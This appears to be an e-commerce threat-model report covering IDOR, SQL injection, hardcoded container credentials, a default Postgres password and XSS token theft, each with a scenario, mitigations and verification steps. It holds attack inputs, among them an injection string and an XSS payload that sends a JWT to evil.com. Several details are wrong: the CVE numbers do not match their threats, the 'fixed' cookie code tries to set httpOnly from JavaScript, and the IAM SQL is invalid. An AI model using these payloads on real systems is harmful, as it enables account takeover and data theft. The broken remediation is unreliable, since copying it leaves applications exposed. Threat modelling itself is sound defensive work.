THREAT #1: INSECURE DIRECT OBJECT REFERENCES (IDOR)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
ID:              TM-ECOM-APIGW-ID-002
Risk Score:      25 (CRITICAL — 5 likelihood × 5 impact)
Component:       API Gateway
STRIDE:          Information Disclosure
MITRE Technique: T1526 (Enumerate Cloud Resources)
MITRE Tactic:    Discovery
CVE:             CVE-2023-28432

ATTACK SCENARIO:
  1. Attacker discovers /users/{userId}/orders endpoint
  2. No authorization check implemented
  3. Attacker enumerates userIds: 1, 2, 3, 4, 5...
  4. Response includes complete order history: addresses, payment methods, order totals
  5. Attacker maps entire customer database including spending patterns

IMPACT:
  - Confidentiality: HIGH (all customer PII exposed: addresses, email, spending)
  - Integrity: NONE
  - Availability: NONE
  - Compliance: CRITICAL (GDPR violation, PCI-DSS 3.2.1 violation)
  - Business: $2.1M estimated liability (if 500k users exposed)

CURRENT STATE: NOT MITIGATED
Remediation:     3 days
Status:          URGENT — Implement within 48 hours

MITIGATION:
  [ ] Implement explicit authorization check: verify_user_id == authenticated_user_id
  [ ] Switch to UUID-based user identifiers (prevents enumeration)
  [ ] Log all IDOR attempts to CloudWatch
  [ ] Alert on 10+ IDOR attempts from single IP
  [ ] Implement per-user rate limiting (1000 req/hour)
  [ ] Test authorization in unit tests for all endpoints
  [ ] Static code analysis: grep -r "user_id" for missing checks

VERIFICATION:
  curl -H "Authorization: Bearer USER_A_TOKEN" \
       https://api.example.com/users/99999/orders
  Should return: 403 Forbidden (or 404 Not Found with generic error)

THREAT #2: SQL INJECTION IN USER SEARCH
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
ID:              TM-ECOM-RDS-T-001
Risk Score:      15 (CRITICAL — 3 likelihood × 5 impact)
Component:       PostgreSQL RDS
STRIDE:          Tampering
MITRE Technique: T1190 (Exploit Public-Facing Application)
MITRE Tactic:    Initial Access
CVE:             CVE-2023-46805

ATTACK SCENARIO:
  1. Spring Boot service has SQL concatenation in UserController.search():
     String query = "SELECT * FROM users WHERE name LIKE '%" + name + "%'";
  2. Attacker sends: name=' OR '1'='1 --
  3. Query becomes: SELECT * FROM users WHERE name LIKE '%' OR '1'='1'  --%'
  4. Returns ALL user records including password hashes
  5. Attacker cracks hashes offline, gains admin account access

IMPACT:
  - Confidentiality: CRITICAL (database breach)
  - Integrity: CRITICAL (attacker can UPDATE/DELETE data)
  - Availability: CRITICAL (attacker can DROP tables)
  - Compliance: VIOLATION (PCI-DSS 6.5.1)

CURRENT STATE: NOT MITIGATED
Remediation:     5 days
Status:          URGENT — Priority #2 after IDOR

MITIGATION:
  [ ] Replace all dynamic queries with parameterized prepared statements
      BEFORE: entityManager.createQuery("SELECT u FROM User u WHERE u.name LIKE %" + name + "%")
      AFTER:  entityManager.createQuery("SELECT u FROM User u WHERE u.name LIKE :name")
              .setParameter("name", "%" + name + "%")
  [ ] Use Spring Data JPA methods: repository.findByNameContaining(name)
  [ ] Enable SonarQube S2077 rule (SOQL injection detection)
  [ ] Enable Checkmarx SQL injection scanning in CI/CD
  [ ] Run static analysis: mvn sonar:sonar -Dsonar.projectKey=ecommerce
  [ ] Enable PostgreSQL query logging (log_statement = all)
  [ ] Monitor for UNION SELECT, OR '1'='1, DROP, -- patterns in logs

VERIFICATION:
  curl https://api.example.com/search?q=%27%20OR%20%271%27=%271
  Should return: 400 Bad Request or safe error message (not all users)

THREAT #3: HARDCODED CREDENTIALS IN CONTAINER
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
ID:              TM-ECOM-ECS-S-001
Risk Score:      15 (CRITICAL — 3 likelihood × 5 impact)
Component:       ECS Fargate
STRIDE:          Spoofing
MITRE Technique: T1552.001 (Unsecured Credentials: Credentials In Files)
MITRE Tactic:    Credential Access
CVE:             CVE-2021-3520

ATTACK SCENARIO:
  1. ECS task definition contains environment variables:
     environment = [
       { name: "DB_USER", value: "admin" },
       { name: "DB_PASS", value: "password123" }
     ]
  2. Container image includes .env file with API keys
  3. Attacker gains container access (via code injection vulnerability)
  4. Reads /proc/self/environ or .env file
  5. Obtains PostgreSQL and API credentials
  6. Direct database access, bypasses application layer security

IMPACT:
  - Confidentiality: CRITICAL (direct database access)
  - Integrity: CRITICAL (attacker can modify data directly)
  - Availability: CRITICAL (attacker can delete database)
  - Blast Radius: ALL connected systems (payment processor, analytics)

CURRENT STATE: HIGH RISK
Remediation:     2 days
Status:          URGENT — Fix immediately, affects all ECS tasks

MITIGATION:
  [ ] Remove ALL credentials from task definition environment
  [ ] Remove .env files from container images (use multi-stage Dockerfile)
  [ ] Migrate credentials to AWS Secrets Manager
      Example: aws secretsmanager get-secret-value --secret-id prod/db-password
  [ ] Reference secrets in ECS task definition (secretsAsEnvironment)
  [ ] Scan container images before deployment:
      docker run --rm -i ghcr.io/trufflesecurity/trufflehog:latest filesystem
      docker run --rm -i ghcr.io/gitguardian/gitguardian-cli scan docker ecommerce-api:latest
  [ ] Enable ECS task audit logging (CloudWatch)
  [ ] Rotate all exposed credentials immediately (RDS, API keys, etc.)
  [ ] Review git history for accidentally committed credentials

VERIFICATION:
  docker inspect ecommerce-api:latest | grep -A 20 '"Env"'
  Should NOT contain: DB_PASS, STRIPE_KEY, JWT_SECRET, etc.

THREAT #4: DEFAULT DATABASE PASSWORD
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
ID:              TM-ECOM-RDS-ID-001
Risk Score:      15 (CRITICAL — 3 likelihood × 5 impact)
Component:       PostgreSQL RDS
STRIDE:          Information Disclosure
MITRE Technique: T1213 (Data from Information Repositories)
MITRE Tactic:    Collection
CVE:             CVE-2021-22911

ATTACK SCENARIO:
  1. RDS master user password never changed from default: "postgres"
  2. Attacker scans for open PostgreSQL on 5432
  3. psql -h <rds-endpoint> -U postgres (tries default password)
  4. Password accepted → full database access
  5. SELECT all PII, credit card data, customer addresses
  6. Export entire database to attacker's server

IMPACT:
  - Confidentiality: CRITICAL (complete database breach)
  - Compliance: GDPR violation, PCI-DSS violation
  - Legal: CCPA notification requirement

CURRENT STATE: IMMEDIATE RISK (if default password still in use)
Remediation:     1 day
Status:          DO THIS RIGHT NOW — Before anything else

MITIGATION:
  [ ] Rotate RDS master password immediately
      aws rds modify-db-instance --db-instance-identifier prod-db --master-user-password $(openssl rand -base64 32) --apply-immediately
  [ ] Store new password in AWS Secrets Manager
  [ ] Enable Secrets Manager automatic rotation (every 30 days)
  [ ] Use IAM database authentication instead of passwords:
      CREATE USER iam_role_user WITH GRANT CONNECT ON DATABASE prod;
      GRANT rds_iam TO iam_role_user;
  [ ] Restrict RDS security group to ECS task SG only (no 0.0.0.0/0)
  [ ] Enable RDS Enhanced Monitoring (DB authentication events logged)
  [ ] Test: psql -h <rds-endpoint> -U postgres (should fail)

VERIFICATION:
  psql -h prod-db.rds.amazonaws.com -U postgres -c "SELECT 1"
  Should return: FATAL:  password authentication failed

THREAT #5: SESSION HIJACKING VIA XSS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
ID:              TM-ECOM-SPA-S-001
Risk Score:      20 (CRITICAL — 4 likelihood × 5 impact)
Component:       React SPA
STRIDE:          Spoofing
MITRE Technique: T1598 (Phishing)
MITRE Tactic:    Initial Access
CVE:             CVE-2022-21224

ATTACK SCENARIO:
  1. React product page doesn't sanitize user reviews
  2. Attacker posts review with payload:
     <img src=x onerror="fetch('https://evil.com?token=' + localStorage.getItem('jwt_token'))">
  3. When another user views product page, XSS fires
  4. JWT token sent to attacker's server
  5. Attacker uses token to make purchases, view order history

IMPACT:
  - Confidentiality: HIGH (user session tokens exposed)
  - Integrity: HIGH (attacker can make purchases as user)
  - Availability: NONE
  - Blast Radius: Per-user impact (can be leveraged for mass account takeover)

CURRENT STATE: HIGH PROBABILITY (if user input not sanitized)
Remediation:     3 days
Status:          HIGH PRIORITY

MITIGATION:
  [ ] Implement Content Security Policy header:
      Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'
  [ ] Use httpOnly + Secure cookies instead of localStorage:
      BEFORE: localStorage.setItem('token', jwt)
      AFTER:  Document.cookie = `token=${jwt}; httpOnly; Secure; SameSite=Strict`
  [ ] Sanitize all user input with DOMPurify:
      import DOMPurify from 'dompurify';
      <div>{DOMPurify.sanitize(userReview)}</div>
  [ ] Implement CSRF token validation on state-changing operations
  [ ] Scan React dependencies: npm audit, npm audit fix
  [ ] Enable Snyk for continuous dependency scanning
  [ ] Run static analysis: eslint-plugin-security, sonar-js
  [ ] Add CSP violation reporting:
      Content-Security-Policy-Report-Only: ... report-uri /csp-report

VERIFICATION:
  curl -v https://api.example.com/product/1 | grep "Content-Security-Policy"
  Should show CSP header with strict directives
